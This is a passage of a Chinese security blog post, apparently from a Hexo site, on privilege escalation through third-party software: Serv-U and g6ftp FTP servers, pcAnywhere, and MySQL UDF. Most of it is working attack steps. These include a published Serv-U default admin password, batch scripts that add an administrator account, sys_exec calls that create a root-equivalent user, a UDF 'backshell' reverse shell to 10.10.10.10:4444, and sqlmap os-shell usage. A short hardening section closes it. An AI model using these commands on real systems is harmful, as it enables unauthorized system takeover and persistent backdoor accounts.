+<li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<p><strong>CVE-2016-6664利用条件</strong></p>
+<ul>
+<li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li>
+<li>2.需要在mysql权限下运行才能利用</li>
+<li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
+</ul>
+<h2 id="FTP提权"><a href="#FTP提权" class="headerlink" title="FTP提权"></a>FTP提权</h2><p><strong>配置不当提权</strong></p>
+<p>ftp用户拥有执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site exec whoami</span><br></pre></td></tr></table></figure>
+<p><strong>serv-u提权</strong></p>
+<p>Serv-U是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令。</p>
+<p>Serv-u&gt;3.x版本：</p>
+<ul>
+<li><p>默认本地管理端口是：<code>43958</code></p>
+</li>
+<li><p>默认管理员：<code>LocalAdministrator</code></p>
+</li>
+<li><p>默认密码：<code>#l@$ak#.lk;0@P</code></p>
+</li>
+</ul>
+<p>这是集成在Serv-u内部的，可以以Guest权限来进行连接，对Serv-u进行管理。</p>
+<p>可以通过连接serv-U然后执行操作系统命令的方式来添加具有管理权限的账户。</p>
+<p>Webshell大马很多都会自带serv-U的提权功能，只需要输入要执行的命令即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 43958</span><br><span class="line">tasklist | findstr 4248</span><br><span class="line">C:\&gt; dir /s /d ServUDaemon.exe</span><br></pre></td></tr></table></figure>
+<p>#下载<code>\Path\Serv-U6.4\ServUDaemon.exe</code>，使用UEditer打开查找<code>Administrator</code>，即可查找到账号密码</p>
+<p><strong>g6ftp</strong></p>
+<p>服务端口：8021</p>
+<p>在任意帐户配置文件中添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SiteCommandList0=-1,ADDUSER,C:\add.bat,0,60,0,0,</span><br><span class="line">SiteCommandList0=-1,TQ1,c:/a.bat,0,60,0,0,jid</span><br><span class="line">TQ1=命令名</span><br><span class="line">c:/a.bat=实际路径</span><br></pre></td></tr></table></figure>
+<p>如果没有修改权限,也可以从本地走</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 8021</span><br><span class="line">tasklist | findstr 1592</span><br><span class="line">C:\&gt; dir /s /d G6FTPServer.exe</span><br><span class="line">Path\gene6ftpserver_cr173\RemoteAdmin\remote.ini</span><br></pre></td></tr></table></figure>
+<p>查看<code>remote.ini</code>，找到password，cmd5破解出密码明文</p>
+<p>使用lck等工具开启端口映射到其他端口，再通过该端口转发与远程服务器建立连接</p>
+<p>通过shell，在目标系统写入bat脚本，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user hack hack /add</span><br><span class="line">net localgroup administrators hack /add</span><br></pre></td></tr></table></figure>
+<p>在服务端配置添加该脚本路径，访问时执行该命令即可成功执行bat脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quote site hack</span><br></pre></td></tr></table></figure>
+<h2 id="SMB提权"><a href="#SMB提权" class="headerlink" title="SMB提权"></a>SMB提权</h2><p><strong>ms17-010</strong></p>
+<h2 id="RPC提权"><a href="#RPC提权" class="headerlink" title="RPC提权"></a>RPC提权</h2><p><strong>ms08-067</strong></p>
+<h3 id="Pcanywhere提权"><a href="#Pcanywhere提权" class="headerlink" title="Pcanywhere提权"></a>Pcanywhere提权</h3><p>pcanywhere是赛门铁克公司出品的一款可以远程连接到服务器的远程桌面工具。</p>
+<p><strong>原理：</strong><br>pcanywhere与windows自带的mstsc（远程桌面）不同的是，pcanywhere不使用windos操作系统的用户密码进行验证，而是用自身建立的用户密码进行验证。</p>
+<p>只要获取到pcanywhere的登录密码，即可获取了服务器的远程桌面。</p>
+<p><strong>密码文件存储位置：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Pcanywherepwd</span><br></pre></td></tr></table></figure>
+<p>提权流程：</p>
+<ol>
+<li><p>服务器安装pcanywehre之后，会在其安装目录下生成相关的CIF文件，此文件的作用是保存了用户名与密码。</p>
+</li>
+<li><p>可以选择将CIF文件下载回本地破解（目前此方法多数已经失效），或者是根据其pcanywhere的版本在本地进行安装，然后建立一个自己知道的用户名密码。</p>
+</li>
+<li><p>将自身所产生的CIF文件上传至服务器并将服务器上的CIF文件替换掉。</p>
+</li>
+<li><p>使用Pcanywhere控制端连接服务器即可，账户密码使用自身刚才设置的那个账户密码。</p>
+</li>
+</ol>
+<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="mysql提权-root权限"><a href="#mysql提权-root权限" class="headerlink" title="mysql提权(root权限)"></a>mysql提权(root权限)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">select sys_exec(&quot;usermod -aG admin &#123;user&#125;&quot;);</span><br><span class="line">exit</span><br><span class="line">sudo su root</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><strong>UDF提权</strong></p>
+<p>参考链接：<a href="https://04z.net/archives/b4914d21.html" target="_blank" rel="noopener">https://04z.net/archives/b4914d21.html</a></p>
+<p>利用条件：</p>
+<ul>
+<li><code>mysql-plugin</code>目录具有写入权限,并且获取路径</li>
+<li>启动mysql的权限为root</li>
+<li>获取到root账户口令[可以到user.MYD文件获取]</li>
+<li>低版本mysql或者没有设置<code>skip‑grant‑tables</code></li>
+</ul>
+<p>注意点:</p>
+<ul>
+<li><code>INTO OUTFILE</code>不会覆盖文件</li>
+<li><code>INTO OUTFILE</code>必须是查询语句的最后一句</li>
+<li>路径名是不能编码的，必须使用单引号</li>
+<li>函数是需要绝对路径</li>
+<li><code>secure_file_priv</code>全局系统变量为空,那么直接可以使用函数,如果为null不能使用,该变量用于限制数据的导入和导出操作，例如<code>SELECT … INTO OUTFILE</code>语句和<code>LOAD_FILE()</code>，mysql的<code>5.5.53</code>之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+<li><code>INTO OUTFILE</code>函数写文件时会在每一行的结束自动加上换行符</li>
+<li><code>INTO DUMPFILE</code>函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</li>
+</ul>
+<p><strong>1. 有可用的.so文件情况下,直接导入导出</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a 确定系统位数x86 x64</span><br><span class="line">[mysqld]</span><br><span class="line">port        = 3306</span><br><span class="line">secure_file_priv =</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br><span class="line">select * from func;</span><br><span class="line">select hex(load_file(&apos;/xx/lib_mysqludf_sys.so&apos;)) into outfile &apos;/tmp/udf.txt&apos;;</span><br><span class="line">cat /tmp/udf.txt</span><br><span class="line">select unhex(&apos;7F454[udf内容]xx...&apos;) into dumpfile &apos;/usr/local/mysql/lib/plugin/mysqludf.so&apos;;</span><br></pre></td></tr></table></figure>
+<p><strong>2. 上传到服务器,反弹shell并重新编译</strong></p>
+<p>上传c文件到tmp目录下,使用gcc编译程序至plugin目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -I/usr/local/mysql/include/ -Os -shared lib_mysqludf_sys.c -fPIC -o /usr/local/mysql/lib/plugin/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
+<p>删除之前并创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DROP FUNCTION IF EXISTS lib_mysqludf_sys_so;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_get;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_set;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_exec;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_eval;</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_get RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_set RETURNS int SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS int SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS string SONAME &apos;lib_mysqludf_sys.so&apos;;</span><br></pre></td></tr></table></figure>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&apos;whoami&apos;);</span><br><span class="line">select sys_exec(&apos;id&apos;);</span><br><span class="line">select sys_exec(&apos;ifconfig&apos;);</span><br><span class="line">select sys_exec(&apos;useradd -u 0 -o -g root -G root -p `openssl passwd -1 -salt &apos;123&apos; evilfox123` evilfox&apos;);</span><br></pre></td></tr></table></figure>
+<p><strong>3. 出现的问题</strong></p>
+<p>编译</p>
+<p>当编译时出现类似报错时,将<code>-I/usr/local/mysql/include/</code>替换成<code>my_globel.h</code>的主目录<br><code>lib_mysqludf_sys.c:40:23: fatal error: my_global.h: No such file or directory#include &lt;my_global.h&gt;</code></p>
+<p>在mysql执行命令返回为null时,也有可能udf库没有系统环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown mysql:mysql /home/cassiano/teste/ -R</span><br></pre></td></tr></table></figure>
+<p>skip-grant-tables</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t initialize function &apos;backshell&apos;; UDFs are unavailable with the --skip-grant-tables option</span><br></pre></td></tr></table></figure>
+<p>需要将my.ini中的skip-grant-tables选项去掉。</p>
+<p>Function sys_eval already exists</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DROP FUNCTION IF EXISTS lib_mysqludf_sys_so;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_get;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_set;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_exec;</span><br><span class="line">DROP FUNCTION IF EXISTS sys_eval;</span><br><span class="line">select * from mysql.plugin;</span><br><span class="line">delete from mysql.plugin;</span><br></pre></td></tr></table></figure>
+<p>重启mysql服务即可</p>
+<p><strong>4. sqlmap-udf-getshell</strong></p>
+<p>存在注入点的情况下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">找到MySQL插件目录,然后利用sqlmap上传 lib_mysqludf_sys到MySQL插件目录,激活存储过程sys_exec函数</span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</span><br><span class="line">    show variables like &quot;%plugin%&quot;;</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --file-write=/lib_mysqludf_sys.so </span><br><span class="line">--file-dest=/usr/lib/mysql/plugin/</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</span><br><span class="line">    CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</span><br><span class="line">    SELECT * FROM information_schema.routines</span><br><span class="line">    sys_exec(id);</span><br></pre></td></tr></table></figure>
+<p>存在外联的情况下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d &quot;mysql://root:root@10.10.10.10:3306/mysql&quot; --os-shell</span><br><span class="line">语法 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME 或者是DBMS://DATABASE_FILEPATH。</span><br><span class="line">[1]dbms:代表所使用的数据库，如我们这里是mysql</span><br><span class="line">[2]user:对应我们数据库的用户，如我们这里是root</span><br><span class="line">[3]password:对应我们数据的密码，如我的服务器为root</span><br><span class="line">[4]dbma_IP:数据库服务器对应的ip地址，如我这里为10.10.10.10</span><br><span class="line">[5]dbms_PORT:数据服务器所使用的端口</span><br><span class="line">[6]database_NAME:你要使用的数据库名</span><br></pre></td></tr></table></figure>
+<p><strong>5. UDF提权总结与防范</strong></p>
+<p>有webshell的提权</p>
+<p>不多说,直接上udf马儿</p>
+<p>无webshell的提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version(); //获取mysql版本 </span><br><span class="line">select @@basedir; //查找到mysql的目录 </span><br><span class="line">SHOW VARIABLES LIKE &apos;%plugin%&apos; //查看高版本插件位置</span><br></pre></td></tr></table></figure>
+<p>通过查询将udf.dll转成代码插入数据库，然后导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use mysql; </span><br><span class="line">set @a=concat(&apos;&apos;,0x代码); </span><br><span class="line">create table Ghost(data LONGBLOB); </span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a; </span><br><span class="line">代码为select hex(load_file(&apos;c:/udf.dll&apos;))中的内容 </span><br><span class="line">select data from Ghost into dumpfile &apos;c:/phpStudy/MySQL/lib/plugin/udf.dll&apos;; //导出ufd.dll </span><br><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;udf.dll&apos;;//创建函数 </span><br><span class="line">select backshell(&quot;10.10.10.10&quot;,4444);</span><br></pre></td></tr></table></figure>
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; -m udf </span><br><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; -m lpk </span><br><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; –m st</span><br></pre></td></tr></table></figure>
+<p><strong>6. 安全防范方法</strong></p>
+<p>尽量避免提供对外链接，通过mysql中的user表进行查看，禁用”%”。<br>设置复杂的Root账号密码。<br>对my.ini设置只读属性，设置plugin目录为只读目录。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/提权/" rel="tag"># 提权</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/08/系统提权/" rel="next" title="系统提权">
+                <i class="fa fa-chevron-left"></i> 系统提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/11/Redis-RCE远程命令执行漏洞复现/" rel="prev" title>
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">EkEk</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/JeremyEkEk" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jeremy.0394@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/anbus/p/10046695.html" title="ArcticShell" target="_blank">ArcticShell</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/Micropoor/Micro8" title="Micropoor亮神" target="_blank">Micropoor亮神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zwjzqqb/article/list/7" title="VincentQB" target="_blank">VincentQB</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/PyxYuYu/MyBlog" title="PyxYuYu" target="_blank">PyxYuYu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://3gstudent.github.io/3gstudent.github.io/" title="三好学生" target="_blank">三好学生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.inksec.cn/archives/page/2/" title="阿墨" target="_blank">阿墨</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.barradell-johns.com/" title="JACK" target="_blank">JACK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adsecurity.org/" title="AD安全" target="_blank">AD安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.fuzzysecurity.com" title="FuzzySecurity" target="_blank">FuzzySecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hexacorn.com/" title="Hexacorn" target="_blank">Hexacorn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://evi1cg.me/" title="Evi1cg" target="_blank">Evi1cg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://b404.xyz/" title="Jirairya" target="_blank">Jirairya</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://payloads.online/" title="倾旋" target="_blank">倾旋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://times0ng.github.io/" title="Times0g" target="_blank">Times0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://firstlove2016.cn/" title="初恋的技术分享" target="_blank">初恋的技术分享</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.netwrix.com/" title="netwrix" target="_blank">netwrix</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://klionsec.github.io/" title="klion" target="_blank">klion</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jivoi.github.io/archive/" title="EK" target="_blank">EK</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://securityer.lofter.com/view" title="走过岁月" target="_blank">走过岁月</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.webbaozi.com/" title="baozi" target="_blank">baozi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.myh0st.cn/" title="信安之路" target="_blank">信安之路</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jdrops.dropsec.xyz/" title="Jdrops" target="_blank">Jdrops</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exploit.kitploit.com/" title="exploit collector" target="_blank">exploit collector</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zjw.dropsec.xyz/" title="Hello_C" target="_blank">Hello_C</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cxsecurity.com/dorks" title="cxsecurity" target="_blank">cxsecurity</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pentest.blog/" title="pentest" target="_blank">pentest</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://rcoil.me/" title="rcoil" target="_blank">rcoil</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://dayu.ink/" title="Dayu" target="_blank">Dayu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://04z.net/" title="04z" target="_blank">04z</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.attackdebris.com/" title="attsckdebris" target="_blank">attsckdebris</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows提权"><span class="nav-text">Windows提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL提权"><span class="nav-text">DLL提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开机启动项提权"><span class="nav-text">开机启动项提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL提权"><span class="nav-text">MSSQL提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL提权"><span class="nav-text">MySQL提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF提权"><span class="nav-text">UDF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOF提权"><span class="nav-text">MOF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-6663-amp-4"><span class="nav-text">CVE-2016-6663&amp;4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP提权"><span class="nav-text">FTP提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB提权"><span class="nav-text">SMB提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RPC提权"><span class="nav-text">RPC提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pcanywhere提权"><span class="nav-text">Pcanywhere提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux提权"><span class="nav-text">Linux提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql提权-root权限"><span class="nav-text">mysql提权(root权限)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EkEk</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://jeremyekek-github-io.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://jeremyekek.github.io/2019/07/09/第三方提权/';
+          this.page.identifier = '2019/07/09/第三方提权/';
+          this.page.title = '第三方提权';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
